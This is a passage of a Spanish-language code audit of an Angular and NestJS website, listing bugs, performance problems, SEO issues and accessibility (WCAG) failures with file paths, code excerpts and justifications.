**Severidad:** MEDIA  
**Categoría:** BUG

**Evidencia:**
```typescript
if (
  utmSource === 'linkedin' || utmMedium === 'linkedin' ||
  utmCampaign.includes('enterprise') || utmCampaign.includes('b2b') ||
  utmSource === 'salesforce' || utmSource === 'hubspot' ||
  utmMedium === 'cpc' && utmCampaign.includes('enterprise')  // && tiene mayor precedencia
) {
```

**Justificación:** Aunque la evaluación final es accidentalmente correcta aquí (ya que `&&` tiene mayor precedencia y la condición compuesta es correcta), el patrón sin paréntesis explícitos `(utmMedium === 'cpc' && utmCampaign.includes('enterprise'))` es propenso a errores en futuras modificaciones. Un desarrollador que añada una nueva condición sin comprender la precedencia puede introducir un bug silencioso en la lógica de segmentación.

---

## BUG-10 — Sentinels de scroll-depth calculan posición antes de que cargue contenido dinámico
**Archivo:** `apps/app/src/app/core/services/analytics.service.ts`  
**Líneas:** 112–118  
**Severidad:** MEDIA  
**Categoría:** BUG

**Evidencia:**
```typescript
requestAnimationFrame(() => {
  const docHeight = Math.max(
    this.document.body.scrollHeight,
    this.document.documentElement.scrollHeight,
  );
  sentinel.style.top = `${Math.floor((pct / 100) * docHeight)}px`;
```

**Justificación:** La altura del documento se calcula en el primer `requestAnimationFrame`, que se ejecuta antes de que el contenido dinámico (lazy-loaded components, imágenes sin dimensiones fijas) haya renderizado. Los sentinels se colocan en posiciones incorrectas. Para rutas con mucho contenido dinámico, el sentinel del 90% puede quedar muy por encima de donde realmente está el 90% del contenido.

---

## BUG-11 — `scroll-engine.service.ts`: fallback usa `getElementById` que no resuelve selectores CSS
**Archivo:** `apps/app/src/app/core/services/scroll-engine.service.ts`  
**Línea:** 82  
**Severidad:** BAJA  
**Categoría:** BUG

**Evidencia:**
```typescript
const el = typeof target === 'string' ? document.getElementById(target) : target;
```

**Justificación:** Cuando `target` es un string como `.my-class` o `#my-id` (con hash), `getElementById` no lo resolverá correctamente. `getElementById` espera solo el ID sin el `#`. Lenis usa `document.querySelector` internamente. El fallback debería usar `document.querySelector(target)`.

---

## BUG-12 — `data.controller.ts`: devuelve `undefined` con HTTP 200 si el slug no existe
**Archivo:** `apps/api/src/app/data.controller.ts`  
**Líneas:** 13–16  
**Severidad:** MEDIA  
**Categoría:** BUG

**Evidencia:**
```typescript
@Get('solutions/:slug')
getSolutionBySlug(@Param('slug') slug: string) {
  return this.dataService.getSolutionBySlug(slug);
}
```

**Justificación:** `SOLUTIONS.find(...)` devuelve `undefined` si no encuentra el slug. NestJS serializa `undefined` como body vacío con HTTP 200. Cualquier cliente que consuma la API recibirá una respuesta vacía exitosa para slugs inválidos. Debe lanzarse `NotFoundException` para devolver HTTP 404 correcto.

---

## BUG-13 — `contact.ts`: lógica de `prefillKnownData()` incompleta
**Archivo:** `apps/app/src/app/features/contact/contact.ts`  
**Líneas:** 132–148  
**Severidad:** BAJA  
**Categoría:** BUG / MALA_PRÁCTICA

**Evidencia:**
```typescript
const segment = this.personalizationService.userSegment();
if (segment && segment !== 'unknown') {
  this.contactForm.patchValue({ referralSource: '' }, { emitEvent: false }); // Establece vacío — sin utilidad
}
```

**Justificación:** La lógica de pre-rellenado del segmento establece `referralSource` a cadena vacía, lo contrario de útil. El código parece incompleto — debería establecer `referralSource` al valor del segmento (e.g. `'enterprise'`), no a `''`.

---

## BUG-14 — `blog-detail.ts`: comentarios mock sin persistencia real
**Archivo:** `apps/app/src/app/features/blog-detail/blog-detail.ts`  
**Líneas:** 101–104  
**Severidad:** MEDIA  
**Categoría:** MALA_PRÁCTICA / UX

**Evidencia:**
```typescript
public comments = signal([
  { author: 'Marcos R.', date: new Date(), text: 'Excelente artículo...' },
  { author: 'Elena M.', date: new Date(), text: 'Muy buena explicación...' }
]);
```

**Justificación:** Los comentarios son datos mock hardcodeados. `submitComment()` añade comentarios solo en memoria (se pierden al recargar) y los muestra como "Guest User" sin autenticación. Es una funcionalidad simulada que engaña al usuario haciéndole creer que sus comentarios se guardan permanentemente.

---

## BUG-15 — Texto hardcodeado en español en app multiidioma
**Archivo:** `apps/app/src/app/features/blog-detail/blog-detail.ts`  
**Línea:** 275  
**Severidad:** MEDIA  
**Categoría:** MALA_PRÁCTICA

**Evidencia:**
```typescript
tooltip.textContent = '¡Copiado!';
```

**Justificación:** En una aplicación con 11 idiomas, este texto está hardcodeado en español. Un usuario en modo inglés, árabe o japonés verá "¡Copiado!" — texto ininteligible. Debe usar `this.translate.instant('BLOG.COPIED')`.

---

## BUG-16 — `app.ts`: `isScrolled` debe ser un signal en contexto zoneless
**Archivo:** `apps/app/src/app/app.ts`  
**Líneas:** 46, 308–317  
**Severidad:** MEDIA  
**Categoría:** BUG / RENDIMIENTO

**Evidencia:**
```typescript
// Línea 46:
public isScrolled = false; // Variable booleana normal
// Línea 308:
@HostListener('window:scroll', [])
onWindowScroll() { this.updateScrollAndResize(); }
```

**Justificación:** El componente raíz usa `provideZonelessChangeDetection()`. Con change detection zoneless, los cambios a variables normales no disparan re-renders automáticamente. `isScrolled` debería ser `signal<boolean>(false)` para garantizar que los cambios se reflejen en el template.

---

## BUG-17 — `window.pageYOffset` deprecated en App root
**Archivo:** `apps/app/src/app/app.ts`  
**Línea:** 327  
**Severidad:** BAJA  
**Categoría:** MALA_PRÁCTICA

**Evidencia:**
```typescript
this.isScrolled = window.pageYOffset > 50;
```

**Justificación:** `window.pageYOffset` está deprecated. La API moderna es `window.scrollY`.

---

## BUG-18 — `HostListener` scroll/resize sin debounce en componente raíz
**Archivo:** `apps/app/src/app/app.ts`  
**Líneas:** 308–317  
**Severidad:** MEDIA  
**Categoría:** RENDIMIENTO

**Evidencia:**
```typescript
@HostListener('window:scroll', [])
onWindowScroll() { this.updateScrollAndResize(); }

@HostListener('window:resize', [])
onWindowResize() { this.updateScrollAndResize(); }
```

**Justificación:** Los eventos `scroll` y `resize` se disparan centenares de veces por segundo. Sin `debounce` o `throttle`, `updateScrollAndResize()` se ejecuta en cada frame causando jank perceptible, especialmente en dispositivos de gama media/baja.

---

## BUG-19 — Todas las traducciones importadas estáticamente en el bundle principal
**Archivo:** `apps/app/src/app/app.config.ts`  
**Líneas:** 23–33  
**Severidad:** MEDIA  
**Categoría:** RENDIMIENTO

**Evidencia:**
```typescript
import * as en from '@assets/i18n/en.json';
import * as es from '@assets/i18n/es.json';
import * as fr from '@assets/i18n/fr.json';
// ... 8 idiomas más
```

**Justificación:** Los 11 archivos de traducción se importan estáticamente en el bundle principal. El usuario que accede en inglés descarga también el JSON completo de árabe, japonés, coreano, etc. Esto añade decenas de KB innecesarios al bundle inicial. La solución correcta para SSR es carga lazy del idioma necesario.

---

## BUG-20 — `@Inject()` redundante en servicios (múltiples archivos)
**Archivos:** `apps/app/src/app/features/about-us/about-us.ts:44`, múltiples  
**Severidad:** BAJA  
**Categoría:** MALA_PRÁCTICA

**Evidencia:**
```typescript
constructor(@Inject(TranslateService) private translate: TranslateService) {
```

**Justificación:** `@Inject()` es para `InjectionToken`s y valores no inferibles. Para servicios como `TranslateService`, el decorador es redundante. El patrón moderno en Angular standalone es `private translate = inject(TranslateService)`.

---

## BUG-21 — Mezcla de estilos de inyección de dependencias en todo el proyecto
**Múltiples archivos**  
**Severidad:** BAJA  
**Categoría:** MANTENIBILIDAD

**Justificación:** El proyecto mezcla tres estilos de DI: `@Inject` en constructor (legacy), inyección por tipo en constructor (`constructor(private svc: MiServicio)`), y `inject()` moderno. Esto dificulta la lectura y el mantenimiento. Debe adoptarse un único estilo en todo el proyecto (preferiblemente `inject()` para componentes standalone modernos).

---

## BUG-22 — `search-overlay.ts` no declara `implements AfterViewInit`
**Archivo:** `apps/app/src/app/shared/components/search-overlay/search-overlay.ts`  
**Línea:** 39  
**Severidad:** BAJA  
**Categoría:** MALA_PRÁCTICA

**Evidencia:**
```typescript
ngAfterViewInit() {
  this.searchInput.nativeElement.focus();
}
// La clase no declara: implements AfterViewInit
```

**Justificación:** Sin `implements AfterViewInit`, TypeScript no validará que la firma del método sea correcta, lo que puede llevar a errores silenciosos si la interfaz cambia en futuras versiones de Angular.

---

## BUG-23 — `console.log` en código de producción del servicio SEO
**Archivo:** `apps/app/src/app/core/services/seo.ts`  
**Líneas:** 108, 113  
**Severidad:** MEDIA  
**Categoría:** MALA_PRÁCTICA

**Evidencia:**
```typescript
console.log('SEO: Setting status to 404 for', fullPath);
console.log('SEO: Setting status to 500 for', fullPath);
```

**Justificación:** Los `console.log` en producción exponen rutas internas y metadatos de la aplicación en las DevTools del cliente. Deben eliminarse o reemplazarse con un logger condicional basado en entorno.

---

## BUG-24 — Breadcrumbs comentados en `app.html`
**Archivo:** `apps/app/src/app/app.html`  
**Líneas:** 5–7  
**Severidad:** MEDIA  
**Categoría:** SEO / UX

**Evidencia:**
```html
<!-- <div class="container mx-auto px-4" style="margin-top: var(--page-top-offset)">
  <app-breadcrumbs></app-breadcrumbs>
</div> -->
```

**Justificación:** El componente de breadcrumbs está desactivado sin documentar el motivo. Las breadcrumbs aportan valor SEO (Schema.org BreadcrumbList, enlaces internos) y orientación al usuario. Si se desactivaron por un bug, debe documentarse; si se desactivaron permanentemente, debe removerse el código muerto.

---

## BUG-25 — Redirect en `app.routes.ts` genera doble entrada en historial
**Archivo:** `apps/app/src/app/app.routes.ts`  
**Líneas:** 334–337  
**Severidad:** BAJA  
**Categoría:** UX / MALA_PRÁCTICA

**Evidencia:**
```typescript
{
  path: '',
  redirectTo: 'home',
  pathMatch: 'full'
},
```

**Justificación:** Cuando un usuario visita `/:lang`, es redirigido a `/:lang/home`. Esto crea dos entradas en el historial del navegador. Al pulsar "Atrás", el usuario vuelve a `/:lang` y es redirigido de nuevo a `/:lang/home` en bucle. Sería más correcto renderizar `HomeComponent` directamente en `path: ''`.

---

## BUG-26 — `thank-you` prerenderizado pero marcado como `noindex`
**Archivos:** `apps/app/src/app/app.routes.server.ts` + `apps/app/src/app/app.routes.ts`  
**Severidad:** BAJA  
**Categoría:** SEO / MALA_PRÁCTICA

**Justificación:** La ruta `/:lang/thank-you` está configurada para prerenderizado pero también marcada con `robots: 'noindex'`. Prerenderizar páginas noindex desperdicia tiempo de build y espacio en servidor. Debe excluirse del prerenderizado.

---

## BUG-27 — Sitemap XML N veces más grande de lo necesario
**Archivo:** `apps/app/src/server.ts`  
**Líneas:** 328–358  
**Severidad:** BAJA  
**Categoría:** SEO / RENDIMIENTO

**Evidencia:**
```typescript
supportedLangs.forEach((lang) => {
  entryXml += '<url>';
  entryXml += `<loc>${url}</loc>`;
  // Y dentro de cada <url>, todos los hreflang de todos los idiomas
  supportedLangs.forEach((altLang) => { ... });
```

**Justificación:** Se generan `N_langs × N_routes` entradas en el sitemap con los mismos alternates repetidos N veces. Con 11 idiomas y 30+ rutas, el sitemap tiene >330 entradas donde deberían ser ~30. Google recomienda una sola `<url>` por URL canónica con todos los `<xhtml:link>` dentro.

---

## BUG-28 — `getStars(count)` crea un Array en cada evaluación del template
**Archivo:** `apps/app/src/app/features/home/home.ts`  
**Línea:** 1079  
**Severidad:** MEDIA  
**Categoría:** RENDIMIENTO

**Evidencia:**
```typescript
getStars(count: number): any[] {
  return new Array(count);
}
```

**Justificación:** Este método se llama desde el template en un bucle sobre testimonios. Cada render del template llama al método y crea un nuevo array, causando re-renders innecesarios. Debe memoizarse o convertirse en un pipe puro.

---

## BUG-29 — `setResourceHints()` llamado en cada navegación (trabajo innecesario repetido)
**Archivo:** `apps/app/src/app/core/services/seo.ts`  
**Líneas:** 389–414 y 52  
**Severidad:** BAJA  
**Categoría:** RENDIMIENTO

**Justificación:** `setResourceHints()` (que añade preconnect/dns-prefetch para fonts) se llama en cada `NavigationEnd`. Los resource hints para fuentes son estáticos y deberían añadirse una sola vez al inicio de la aplicación, no en cada cambio de ruta.

---

## BUG-30 — Generación del sitemap en cada petición sin caché
**Archivo:** `apps/app/src/server.ts`  
**Líneas:** 386–392  
**Severidad:** ALTA  
**Categoría:** RENDIMIENTO

**Evidencia:**
```typescript
app.get('/sitemap.xml', (req, res) => {
  const sitemap = generateSitemap(domain); // Sin cache
  res.send(sitemap);
});
```

**Justificación:** `generateSitemap()` itera sobre todas las colecciones de datos y genera XML para 11 idiomas × N rutas en cada petición, sin `Cache-Control` ni caché en memoria. Con cada crawl de Google/Bing, esta operación costosa se repite desde cero.

---

## BUG-31 — Carga artificial de 1.5 segundos degrada Core Web Vitals
**Archivo:** `apps/app/src/app/features/home/home.ts`  
**Líneas:** 501–508  
**Severidad:** MEDIA  
**Categoría:** RENDIMIENTO / UX

**Evidencia:**
```typescript
setTimeout(() => {
  this.isLoading.set(false);
  setTimeout(() => this.initializeOfferingsSlider(), 0);
}, 1500);
```

**Justificación:** Se simula un estado de carga de 1.5 segundos artificialmente. Esto degrada el LCP y FCP en 1.5 segundos de forma intencional, penalizando directamente el Core Web Vitals score de Google. No hay justificación técnica para este delay; el contenido debería mostrarse tan pronto como esté disponible.

---

## BUG-32 — Analytics `form_field_interaction` por cada pulsación de tecla
**Archivo:** `apps/app/src/app/features/contact/contact.ts`  
**Líneas:** 150–173  
**Severidad:** MEDIA  
**Categoría:** RENDIMIENTO

**Evidencia:**
```typescript
this.contactForm.valueChanges
  .pipe(takeUntil(this.destroy$))
  .subscribe((value) => {
    this.analytics.trackEvent('form_field_interaction', { ... });
    // Sin debounce
  });
```

**Justificación:** Cada pulsación de tecla en cualquier campo del formulario dispara un evento de analytics. Un usuario que escribe "hello world" genera 11 eventos. Esto satura el dataLayer de GTM y puede causar throttling del navegador. Debe añadirse `debounceTime(500)`.

---

## BUG-33 — Ausencia de caché en `DataService` del frontend
**Archivo:** `apps/app/src/app/core/services/data.service.ts`  
**Líneas:** 175–297  
**Severidad:** MEDIA  
**Categoría:** RENDIMIENTO

**Justificación:** Todos los métodos crean un nuevo Observable HTTP en cada llamada, sin `shareReplay(1)` ni caché de estado. Si múltiples componentes se suscriben simultáneamente a `getSolutions()`, se realizan N llamadas HTTP duplicadas al servidor.

---

## BUG-34 — `VideoModalComponent` no integra `OverlayManagerService` para bloquear scroll
**Archivo:** `apps/app/src/app/shared/components/video-modal/video-modal.ts`  
**Líneas:** 108–123  
**Severidad:** BAJA  
**Categoría:** UX / MALA_PRÁCTICA

**Justificación:** El modal de video cubre toda la pantalla pero no llama a `OverlayManagerService.register()` ni `unregister()`, lo que significa que el scroll del fondo no se bloquea cuando el video está abierto — inconsistente con el comportamiento del resto de modales del proyecto.

---

## BUG-35 — Búsqueda global siempre usa datos mock, nunca consulta el servidor
**Archivo:** `apps/app/src/app/core/services/data.service.ts`  
**Líneas:** 301–347  
**Severidad:** MEDIA  
**Categoría:** MALA_PRÁCTICA

**Evidencia:**
```typescript
search(query: string): Observable<{ type: string; item: any }[]> {
  const q = query.toLowerCase();
  // Búsqueda solo sobre constantes estáticas locales
  return of(results);
}
```

**Justificación:** La búsqueda global nunca hace peticiones al backend. Si los datos del servidor difieren de los datos mock (esperado en producción), los resultados de búsqueda serán incorrectos o incompletos.

---

---

# SECCIÓN IV — UX, ACCESIBILIDAD Y SEMÁNTICA HTML

---

## ACC-01 — Ausencia de "skip to main content" link
**Archivo:** `apps/app/src/index.html`  
**Línea:** 127–129  
**Severidad:** CRÍTICA  
**Categoría:** ACCESIBILIDAD (WCAG 2.4.1)

**Evidencia:**
```html
<body>
  <jsl-root></jsl-root>
</body>
```

**Justificación:** No hay ningún "skip to main content" link antes del header. Usuarios que navegan por teclado deben atravesar todo el menú de navegación (con todos sus submenús y botones) en cada carga de página para llegar al contenido. Es uno de los requisitos más básicos de accesibilidad (WCAG 2.4.1 — Nivel A).

---

## ACC-02 — Inputs sin `<label>` en Lead Magnet, Whitepaper y 404
**Archivos:**
- `apps/app/src/app/features/home/home.html:480`
- `apps/app/src/app/shared/components/whitepaper-download/whitepaper-download.html:67`
- `apps/app/src/app/features/not-found/not-found.html:12`
**Severidad:** CRÍTICA  
**Categoría:** ACCESIBILIDAD (WCAG 1.3.1, 3.3.2)

**Evidencia:**
```html
<!-- home.html -->
<input type="email" [placeholder]="'HOME.LEAD_MAGNET_PLACEHOLDER' | translate" class="lead-magnet-input" />

<!-- not-found.html -->
<input type="search" [placeholder]="'NOT_FOUND.SEARCH_PLACEHOLDER' | translate">
<button class="not-found-search__btn">
  <lucide-icon name="Search" [size]="18"></lucide-icon>  <!-- Sin aria-label -->
</button>
```

**Justificación:** El placeholder no es sustituto de una label (desaparece al escribir). Los lectores de pantalla no anunciarán el propósito del campo. El botón de búsqueda de la página 404 no tiene texto visible ni `aria-label`. Violación WCAG 1.3.1 y 4.1.2.

---

## ACC-03 — ROI Calculator: inputs range sin asociación explícita label→input
**Archivo:** `apps/app/src/app/shared/components/roi-calculator/roi-calculator.component.html`  
**Líneas:** 13–55  
**Severidad:** CRÍTICA  
**Categoría:** ACCESIBILIDAD (WCAG 1.3.1)

**Evidencia:**
```html
<label>
  <lucide-icon [name]="icons.Clock" size="16"></lucide-icon>  <!-- Sin aria-hidden -->
  {{ 'MATURITY.ROI_CALCULATOR.HOURS_SAVED' | translate }}
</label>
<div class="range-wrapper">
  <input type="range" [ngModel]="hoursSaved()" min="1" max="40" step="1">
  <!-- Sin id, sin for en label -->
```

**Justificación:** Los `<label>` no están asociados explícitamente a los inputs mediante `for`+`id`. El ícono lucide dentro del label no tiene `aria-hidden="true"`, añadiendo ruido semántico. Los inputs range no tienen `aria-valuetext` para anunciar el valor en unidades legibles ("40 horas").

---

## ACC-04 — Modales sin `role="dialog"`, `aria-modal`, ni focus trap
**Archivos:**
- `apps/app/src/app/features/home/components/exit-intent-modal/exit-intent-modal.html:1`
- `apps/app/src/app/features/blog-detail/blog-detail.html:229` (comments modal)
- `apps/app/src/app/features/blog-detail/blog-detail.html:216` (share modal)
- `apps/app/src/app/shared/components/search-overlay/search-overlay.html:1`
**Severidad:** CRÍTICA  
**Categoría:** ACCESIBILIDAD (WCAG 2.1.2)

**Evidencia:**
```html
<div class="modal-overlay" @overlayAnimation (click)="onClose()">
  <div class="modal-container" @modalAnimation (click)="$event.stopPropagation()">
    <!-- Sin role="dialog", sin aria-modal, sin aria-labelledby, sin focus trap -->
```

**Justificación:** Ninguno de los modales del proyecto implementa el patrón ARIA de diálogo: `role="dialog"`, `aria-modal="true"`, `aria-labelledby` apuntando al título, gestión del foco al abrir/cerrar, ni trap de foco (Tab debe ciclar dentro del modal). Los usuarios de lectores de pantalla pueden "escapar" del modal y leer contenido de fondo.

---

## ACC-05 — `<div>` interactivo como search trigger (no accesible por teclado)
**Archivo:** `apps/app/src/app/features/home/home.html`  
**Líneas:** 218–221  
**Severidad:** ALTA  
**Categoría:** ACCESIBILIDAD (WCAG 2.1.1, 4.1.2)

**Evidencia:**
```html
<div class="search-trigger" (click)="openSearch()">
  <lucide-icon name="Search"></lucide-icon>
  <span>{{ 'HOME.SEARCH_PLACEHOLDER' | translate }}</span>
</div>
```

**Justificación:** Elemento interactivo implementado como `<div>`. No tiene `role="button"`, `tabindex="0"`, ni handlers de teclado (`keydown.enter`, `keydown.space`). Es completamente inaccesible por teclado.

---

## ACC-06 — Tabs de "Offerings" sin roles ARIA de tabs
**Archivo:** `apps/app/src/app/features/home/home.html`  
**Líneas:** 225–241  
**Severidad:** MEDIA  
**Categoría:** ACCESIBILIDAD (WCAG 4.1.2)

**Evidencia:**
```html
<div class="offerings-tabs">  <!-- Sin role="tablist" -->
  <button class="tab-btn" [class.active]="activeTab() === 'services'" (click)="setActiveTab('services')">
  <!-- Sin role="tab", sin aria-selected -->
```

**Justificación:** El contenedor `.offerings-tabs` no tiene `role="tablist"`, los botones no tienen `role="tab"` ni `aria-selected`, y los paneles de contenido no tienen `role="tabpanel"`. No se respeta el patrón ARIA de tabs (navegación con flechas). Un usuario de AT no puede interactuar correctamente con este componente.

---

## ACC-07 — FAQs sin `aria-controls` ni IDs en los paneles
**Archivo:** `apps/app/src/app/features/faq/faq.html`  
**Líneas:** 63–65  
**Severidad:** MEDIA  
**Categoría:** ACCESIBILIDAD

**Evidencia:**
```html
<button
  class="faq-card__trigger"
  (click)="toggleQuestion($index)"
  [attr.aria-expanded]="openQuestionIndex() === $index">
  <!-- Sin aria-controls -->
```

**Justificación:** El botón tiene `aria-expanded` correcto, pero falta `aria-controls` apuntando al ID del panel de respuesta. El panel no tiene `id` correspondiente. Los lectores de pantalla no pueden anunciar correctamente qué elemento se expande/colapsa.

---

## ACC-08 — Paginación sin `aria-current="page"` ni `role="navigation"`
**Archivo:** `apps/app/src/app/shared/components/pagination/pagination.html`  
**Líneas:** 17–21  
**Severidad:** MEDIA  
**Categoría:** ACCESIBILIDAD

**Evidencia:**
```html
<button
  class="page-number"
  [class.active]="page === currentPage"
  (click)="onPageChange(page)">
  {{ page }}
</button>
```

**Justificación:** El botón de página activo no tiene `aria-current="page"`. El contenedor `.pagination` no tiene `role="navigation"` ni `aria-label`. Los usuarios de AT no saben cuál es la página actual.

---

## ACC-09 — Skeleton loader sin `aria-busy` ni `aria-label`
**Archivo:** `apps/app/src/app/shared/components/skeleton-loader/skeleton-loader.component.html`  
**Línea:** 1–8  
**Severidad:** MEDIA  
**Categoría:** ACCESIBILIDAD

**Justificación:** El skeleton loader no tiene `aria-busy="true"` en el contenedor padre ni `aria-label` como "Cargando contenido". Los usuarios de lectores de pantalla no saben que hay contenido cargándose.

---

## ACC-10 — Image comparison slider con `aria-label` hardcodeado en inglés
**Archivo:** `apps/app/src/app/shared/components/image-comparison/image-comparison.html`  
**Líneas:** 22–29  
**Severidad:** MEDIA  
**Categoría:** ACCESIBILIDAD

**Evidencia:**
```html
[attr.aria-label]="'Comparison slider'"  <!-- Hardcodeado en inglés en app multiidioma -->
```

**Justificación:** En una aplicación con 11 idiomas, este `aria-label` está hardcodeado en inglés. Debe usar el pipe de traducción. Además falta `aria-valuetext` para dar contexto ("50% - mostrando imagen moderna").

---

## ACC-11 — Scroll indicator decorativo sin `aria-hidden`
**Archivo:** `apps/app/src/app/features/home/home.html`  
**Líneas:** 126–131  
**Severidad:** ALTA  
**Categoría:** ACCESIBILIDAD

**Evidencia:**
```html
<div class="scroll-indicator" [class.hidden]="!showScrollIndicator()">
  <div class="mouse"><div class="wheel"></div></div>
  <div class="arrow"></div>
</div>
```

**Justificación:** Elemento visual puramente decorativo sin `aria-hidden="true"`. Los lectores de pantalla intentarán leer estos `<div>` vacíos anidados, generando ruido semántico innecesario.

---

## ACC-12 — Toast container sin live region ARIA
**Archivo:** `apps/app/src/app/shared/components/toast/toast.html`  
**Líneas:** 1–19  
**Severidad:** MEDIA  
**Categoría:** ACCESIBILIDAD

**Evidencia:**
```html
<div class="toast-container">
  @for (toast of toastService.toasts$ | async; track toast.id) {
    <div class="toast" [ngClass]="toast.type">
    <!-- Sin role="alert", sin role="status", sin aria-live -->
```

**Justificación:** Las notificaciones toast no son anunciadas por lectores de pantalla. Para toasts de error debe usarse `role="alert"` (assertive), para información `role="status"` (polite). Es un fallo de accesibilidad crítico para usuarios que dependen de AT.

---

## ACC-13 — Progress bar del formulario de contacto sin ARIA
**Archivo:** `apps/app/src/app/features/contact/contact.html`  
**Líneas:** 117–119  
**Severidad:** MEDIA  
**Categoría:** ACCESIBILIDAD

**Evidencia:**
```html
<div class="form-progress">
  <div class="form-progress__bar" [style.width.%]="progressPercent()"></div>
</div>
```

**Justificación:** La barra de progreso no tiene `role="progressbar"`, `aria-valuenow`, `aria-valuemin="0"`, `aria-valuemax="100"`, ni `aria-label`. Un usuario de AT no sabe qué porcentaje del formulario ha completado.

---

## ACC-14 — Step indicator del formulario sin `aria-current="step"`
**Archivo:** `apps/app/src/app/features/contact/contact.html`  
**Líneas:** 99–113  
**Severidad:** ALTA  
**Categoría:** ACCESIBILIDAD / UX

**Evidencia:**
```html
<div class="form-step" [class.form-step--active]="currentStep() === s" ...>
  <!-- Sin aria-current="step", sin anuncio de progreso -->
```

**Justificación:** El indicador de paso activo solo es visual. No hay `aria-current="step"` ni `aria-label` que anuncie "Paso 2 de 3: Tu proyecto". El `aria-label` del form-step-content está hardcodeado en inglés: `aria-label="Step 1 of 3: Your identity"`.

---

## ACC-15 — Botón "Ver grabación" completamente no funcional
**Archivo:** `apps/app/src/app/features/events/events.html`  
**Línea:** 39  
**Severidad:** CRÍTICA  
**Categoría:** UX / BUG

**Evidencia:**
```html
<button class="btn-outline">{{ 'EVENTS.WATCH_RECORDING' | translate }}</button>
<!-- Sin (click) handler, sin href, sin ninguna acción -->
```

**Justificación:** El botón "Ver grabación" de eventos pasados no tiene ningún handler de clic ni enlace asociado. Es completamente no funcional: el usuario hace clic y absolutamente nada ocurre. Es el bug de UX más grave del proyecto — presenta una funcionalidad inexistente.

---

## ACC-16 — `href="#"` en eventos sin URL de registro
**Archivo:** `apps/app/src/app/features/events/events.html`  
**Línea:** 23  
**Severidad:** ALTA  
**Categoría:** UX / SEO

**Evidencia:**
```html
<a [href]="event.registrationUrl || '#'" class="btn-register" target="_blank" rel="noopener noreferrer">
```

**Justificación:** Cuando `event.registrationUrl` es null/undefined, el link tiene `href="#"` que lleva al usuario al tope de la página, confundiendo y frustrando. Debe renderizarse un `<button>` deshabilitado o un mensaje "Próximamente" si no hay URL.

---

## ACC-17 — Tabla comparativa de Pricing implementada con `<div>` en lugar de `<table>`
**Archivo:** `apps/app/src/app/features/pricing/pricing.html`  
**Líneas:** 151–176  
**Severidad:** MEDIA  
**Categoría:** ACCESIBILIDAD / SEMÁNTICA_HTML (WCAG 1.3.1)

**Evidencia:**
```html
<div class="comparison-table">
  <div class="header-row">
    <div class="cell feature">{{ 'PRICING.FEATURE' | translate }}</div>
```

**Justificación:** Una tabla comparativa implementada como `<div>` pierde completamente la semántica de tabla. Los lectores de pantalla no pueden leer comparaciones de columnas (no pueden anunciar "para la columna Virteex, esta característica es [valor]"). Google puede no interpretar correctamente la relación entre encabezados y valores. Debe usarse `<table>`, `<thead>`, `<tbody>`, `<tr>`, `<th>` y `<td>`.

---

## ACC-18 — Links de autor con solo `[title]` sin `aria-label` (no accesible en móvil)
**Archivo:** `apps/app/src/app/features/blog-detail/blog-detail.html`  
**Líneas:** 152–160  
**Severidad:** MEDIA  
**Categoría:** ACCESIBILIDAD

**Evidencia:**
```html
<a [href]="author.linkedIn" target="_blank" [title]="'SHARE.LINKEDIN' | translate">
  <lucide-icon name="Linkedin"></lucide-icon>
  <!-- Sin aria-label, sin rel="noreferrer" -->
</a>
```

**Justificación:** El `title` no es accesible en móvil (no se puede activar sin hover). Debe añadirse `[attr.aria-label]`. Falta también `rel="noopener noreferrer"`.

---

## ACC-19 — Filter pills sin `aria-pressed`
**Archivo:** `apps/app/src/app/features/home/home.html`  
**Líneas:** 356–364  
**Severidad:** MEDIA  
**Categoría:** ACCESIBILIDAD / UX

**Evidencia:**
```html
<button class="filter-pill" [class.active]="selectedProjectCategory() === category">
  <!-- Sin aria-pressed -->
```

**Justificación:** Los filter pills son botones toggle. Sin `[attr.aria-pressed]="selectedProjectCategory() === category"`, un usuario de AT no sabe cuál filtro está activo actualmente.

---

## ACC-20 — Digital Maturity progress bar sin ARIA
**Archivo:** `apps/app/src/app/features/home/components/digital-maturity-selector/digital-maturity-selector.html`  
**Severidad:** MEDIA  
**Categoría:** ACCESIBILIDAD

**Justificación:** La barra de progreso del selector de madurez digital no tiene `role="progressbar"`, `aria-valuenow`, `aria-valuemin`, `aria-valuemax`. El contenedor de pregunta tampoco tiene `aria-live="polite"` para anunciar el cambio de pregunta.

---

## ACC-21 — Breadcrumbs sin estructura `<ol>/<li>` ni `aria-current="page"`
**Archivo:** `apps/app/src/app/features/product-detail/product-detail.html`  
**Línea:** 12  
**Severidad:** ALTA  
**Categoría:** ACCESIBILIDAD / SEO

**Evidencia:**
```html
<nav class="pd-breadcrumb" [attr.aria-label]="'ARIA.BREADCRUMB' | translate">
  <a [routerLink]="['/', currentLang, 'home']">...</a>
  <lucide-icon name="ChevronRight" [size]="14"></lucide-icon>  <!-- Sin aria-hidden -->
  <a [routerLink]="['/', currentLang, 'products']">...</a>
```

**Justificación:** Falta `<ol>/<li>` structure (recomendado para breadcrumbs), `aria-current="page"` en el último elemento, y `aria-hidden="true"` en los separadores (los iconos SVG son anunciados por AT).

---

## ACC-22 — Indicador de galería sin descripciones únicas por imagen
**Archivo:** `apps/app/src/app/features/life-at-jsl/life-at-jsl.html`  
**Línea:** 64  
**Severidad:** ALTA  
**Categoría:** ACCESIBILIDAD

**Evidencia:**
```html
<img [src]="img" [alt]="'LIFE_AT_JSL.GALLERY_ALT' | translate" loading="lazy">
```

**Justificación:** Todas las imágenes de la galería comparten exactamente el mismo alt text. Cada imagen debería tener un alt único y descriptivo que explique el contenido específico de la foto.

---

## ACC-23 — Links de blog con `routerLink` relativo que puede fallar
**Archivo:** `apps/app/src/app/features/contact/contact.html`  
**Línea:** 313  
**Severidad:** MEDIA  
**Categoría:** SEO / UX

**Evidencia:**
```html
<a routerLink="../privacy-policy" target="_blank">
```

**Justificación:** La ruta relativa `../privacy-policy` fallará si la URL base cambia. Debe ser una ruta absoluta con idioma: `[routerLink]="['/', currentLang, 'legal', 'privacy']"`.

---

## ACC-24 — Copy link sin feedback de accesibilidad para AT
**Archivo:** `apps/app/src/app/shared/components/social-share/social-share.html`  
**Líneas:** 62–68  
**Severidad:** MEDIA  
**Categoría:** ACCESIBILIDAD / UX

**Evidencia:**
```html
<input type="text" [value]="shareUrl" readonly #urlInput />
<button (click)="copyLink()" [class.copied]="copied()">
<!-- Sin aria-live region para anunciar "¡Copiado!" -->
```

**Justificación:** Cuando el link es copiado, no hay `aria-live` region que anuncie el cambio de estado a lectores de pantalla. El input `readonly` no tiene `aria-label`.

---

## ACC-25 — `prefers-reduced-motion` no implementado en ninguna animación del proyecto
**Archivos:**
